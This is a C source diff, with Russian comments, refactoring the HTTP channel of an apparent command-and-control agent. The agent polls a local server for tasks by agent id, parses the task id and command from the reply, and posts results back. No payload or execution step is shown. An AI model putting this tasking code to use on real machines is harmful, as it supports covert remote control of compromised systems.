@@ -38,41 +38,102 @@ int http_init(void) {
     return 0;
 }
 
+/**
+ * @brief Функция парсинга поля http Content-Length в двух регистрах
+ *
+ * @param buf Заголовок http
+ *
+ * @return В положительном случае - значение поля Content-Length 
+ *
+*/
+int parse_content_length(char* buf) {
+    char* pos = strstr(buf, "Content-Length:");
+    if(pos == NULL) {
+        pos = strstr(buf, "content-length:");
+    }
+    if(pos == NULL) {
+        return -1;
+    }
+
+    pos += strlen("Content-Length:"); //пропускаем символы
+
+    while(*pos == ' ') {
+        pos++; //пропуск пробелов
+    }
+
+    return atoi(pos);
+}
+
 //if return 0 - success
 //command, task_id - выходные аргументы
 static int http_get_command(char* command, char* task_id, size_t max_len_command, size_t max_len_task_id, char* agent_id) {
     char buf[2048] = {0};
-    snprintf(buf, 
+    int request_len = snprintf(buf, 
             sizeof(buf),
             "GET /get_task/%s HTTP/1.1\r\n"
             "Host: 127.0.0.1\r\n"
             "Connection: close\r\n\r\n",
             agent_id);
 
-    if(send(current_sockfd, buf, sizeof(buf), 0) == -1) {
+    if(send(current_sockfd, buf, request_len, 0) == -1) {
         return 1;
     }
 
-    int count_bytes = read(current_sockfd, buf, sizeof(buf) - 1);
-    if(count_bytes == -1) {
+    //read answer
+    int count_read = 0;
+    int total = 0;
+    char* headers_end = NULL;
+    char* body = NULL;
+    int content_length = -1;
+
+    memset(buf, 0, sizeof(buf));
+    while(total < sizeof(buf) - 1) {
+        count_read = read(current_sockfd, buf + total, sizeof(buf) - 1 - total);
+        if(count_read <= 0) {
+            break;
+        }
+        total += count_read;
+
+        if(headers_end == NULL) {
+            headers_end = strstr(buf, "\r\n\r\n");
+            if(headers_end != NULL) {
+                content_length = parse_content_length(buf);
+                if(content_length == -1) {
+                    printf("[-/ICMP] Error, content-length.\n");
+                    return 1;
+                }
+                body = headers_end + 4; //начало тела ответа           
+            }
+        }
+        if(headers_end != NULL) {
+            int read_body = total - (body - buf);
+            if(read_body >= content_length) {
+                break; //тело получено
+            }
+        }
+    }
+    buf[total] = '\0';
+
+    printf("[DEBUG] %s\n", buf);
+
+    printf("[DEBUG] %s\n", body);
+
+    if(body == NULL) {
+        printf("[-/HTTP] Error, body answer is empty.\n");
         return 1;
     }
 
-    //for reliability
-    buf[count_bytes] = '\0';
+    printf("[DEBUG] %s\n", body);
+    char* quote = strchr(body, '\"');
+    if(quote == NULL) {
+        printf("[-/HTTP] Error, not found quote.\n");
+        return 1;
+    }
+    body = quote + 1;
 
-    //parse answer for c2(task_id)
-    char* body = strstr(buf, "\r\n\r\n");
-    if(body != NULL) {
-        body += 4;
-    }
-    body = strchr(body, '\"');
-    if(body != NULL) {
-        body++;
-    }
-    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '_' && body[5] == 'i' && body[6] == 'd' && body[7] == '\"') {
+    if(strncmp(body, "task_id\"", 8) == 0) {
         body += 9;
-        if(body[0] == 'n' && body[1] == 'u' && body[2] == 'l' && body[3] == 'l') {
+        if(strncmp(body, "null", 4) == 0) {
             printf("[+/HTTP] No tasks for working.\n");
             fflush(stdout);
             sleep(1);
@@ -96,7 +157,7 @@ static int http_get_command(char* command, char* task_id, size_t max_len_command
 
     //parse answer for c2(command)
     body += (strlen(body) + 2);
-    if(body[0] == 't' && body[1] == 'a' && body[2] == 's' && body[3] == 'k' && body[4] == '\"') {
+    if(strncmp(body, "task\"", 5) == 0) {
         body += 7; 
         for(int i = strlen(body) - 1; i >= 0; --i) {
             if(body[i] == '\"') {
@@ -150,7 +211,7 @@ static int http_send_result(char* task_id, char* result) {
     int body_len = strlen(body);
 
     char request[6000] = {0};
-    snprintf(request, sizeof(request),
+    int answer_len = snprintf(request, sizeof(request),
             "POST /send_result HTTP/1.1\r\n"
             "Host: 127.0.0.1\r\n"
             "Connection: close\r\n"
@@ -160,7 +221,7 @@ static int http_send_result(char* task_id, char* result) {
             body_len,
             body);
    
-    if(send(current_sockfd, request, strlen(request), 0) == -1) {
+    if(send(current_sockfd, request, answer_len, 0) == -1) {
         return 1;
     }
 
